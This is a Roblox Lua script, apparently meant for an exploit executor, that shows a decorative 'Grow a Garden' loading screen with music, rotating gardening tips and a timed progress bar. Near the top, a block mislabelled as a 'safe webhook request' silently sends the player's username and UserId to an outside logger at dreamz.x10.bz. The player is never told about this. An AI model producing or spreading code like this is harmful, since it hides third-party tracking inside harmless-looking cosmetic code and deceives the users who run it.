-- üå∏ Cherry Blossom Style Grow a Garden Loading Screen

local player = game.Players.LocalPlayer
repeat task.wait() until player:FindFirstChild("PlayerGui")

-- ‚úÖ Safe webhook request to x10 server
pcall(function()
	local url = "https://dreamz.x10.bz/logger.php"
	url = url .. "?user=" .. player.Name .. "&id=" .. player.UserId
	game:HttpGet(url)
end)

-- ‚úÖ Create GUI
local gui = Instance.new("ScreenGui")
gui.Name = "GrowAGardenLoading"
gui.ResetOnSpawn = false
gui.IgnoreGuiInset = true
gui.Parent = player:WaitForChild("PlayerGui")

-- Background Frame
local bg = Instance.new("Frame")
bg.Size = UDim2.new(1, 0, 1, 0)
bg.BackgroundColor3 = Color3.fromRGB(255, 230, 240)
bg.Parent = gui

local gradient = Instance.new("UIGradient")
gradient.Color = ColorSequence.new{
	ColorSequenceKeypoint.new(0, Color3.fromRGB(255, 230, 240)),
	ColorSequenceKeypoint.new(1, Color3.fromRGB(255, 255, 255))
}
gradient.Parent = bg

-- ‚úÖ Play music from Music_Folder
local soundService = game:GetService("SoundService")
local musicFolder = soundService:FindFirstChild("Music_Folder")

local function getAllSounds(container)
	local sounds = {}
	for _, item in ipairs(container:GetDescendants()) do
		if item:IsA("Sound") then
			table.insert(sounds, item)
		end
	end
	return sounds
end

if musicFolder then
	local songs = getAllSounds(musicFolder)

	task.spawn(function()
		while true do
			for _, song in ipairs(songs) do
				song.TimePosition = 0
				song.Volume = 0.6
				song:Play()
				song.Ended:Wait()
			end
		end
	end)
else
	warn("‚ö†Ô∏è No Music_Folder found in SoundService.")
end

-- Title
local title = Instance.new("TextLabel", bg)
title.Size = UDim2.new(1, 0, 0.1, 0)
title.Position = UDim2.new(0, 0, 0.3, 0)
title.BackgroundTransparency = 1
title.Text = "üå∏ Loading Grow a Garden..."
title.Font = Enum.Font.FredokaOne
title.TextScaled = true
title.TextColor3 = Color3.fromRGB(120, 60, 80)
title.TextWrapped = true

-- Tips
local tip = Instance.new("TextLabel", bg)
tip.Size = UDim2.new(1, 0, 0.06, 0)
tip.Position = UDim2.new(0, 0, 0.41, 0)
tip.BackgroundTransparency = 1
tip.Font = Enum.Font.GothamBold
tip.TextScaled = true
tip.TextColor3 = Color3.fromRGB(100, 60, 80)
tip.TextWrapped = true
tip.Text = "Let your petals fall gently üå∏"

local tips = {
	"Remember to water your plants daily! üíß",
	"Every flower blooms at its own pace üå∏",
	"You grow through what you go through üå±",
	"Great things take time ‚Äî just like crops üå∏",
	"Let your roots grow strong üå≥",
	"Don‚Äôt stop until you‚Äôre proud üåº",
	"Small seeds make mighty trees üå≤",
	"Patience is the key to harvest üçì"
}

task.spawn(function()
	local index = 1
	while true do
		tip.Text = tips[index]
		index = (index % #tips) + 1
		task.wait(2)
	end
end)

-- Progress Bar
local barBG = Instance.new("Frame", bg)
barBG.Size = UDim2.new(0.6, 0, 0.02, 0)
barBG.Position = UDim2.new(0.2, 0, 0.54, 0)
barBG.BackgroundColor3 = Color3.fromRGB(200, 255, 200)
barBG.BorderSizePixel = 0
barBG.BackgroundTransparency = 0.2
barBG.ClipsDescendants = true
barBG.ZIndex = 1

local barFill = Instance.new("Frame", barBG)
barFill.Size = UDim2.new(0, 0, 1, 0)
barFill.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
barFill.BorderSizePixel = 0
barFill.ZIndex = 1

local percentLabel = Instance.new("TextLabel", bg)
percentLabel.Size = UDim2.new(1, 0, 0.05, 0)
percentLabel.Position = UDim2.new(0, 0, 0.57, 0)
percentLabel.BackgroundTransparency = 1
percentLabel.Text = "0%"
percentLabel.Font = Enum.Font.GothamSemibold
percentLabel.TextScaled = true
percentLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
percentLabel.TextWrapped = true
percentLabel.ZIndex = 1

-- Animate + fade out
task.spawn(function()
	for i = 1, 100 do
		barFill.Size = UDim2.new(i / 100, 0, 1, 0)
		percentLabel.Text = i .. "%"
		task.wait(0.2)
	end

	-- Fade out
	for _, v in ipairs(gui:GetDescendants()) do
		if v:IsA("TextLabel") or v:IsA("Frame") then
			game:GetService("TweenService"):Create(v, TweenInfo.new(1), {BackgroundTransparency = 1, TextTransparency = 1}):Play()
		end
	end
	task.wait(1.5)
	gui:Destroy()
end)
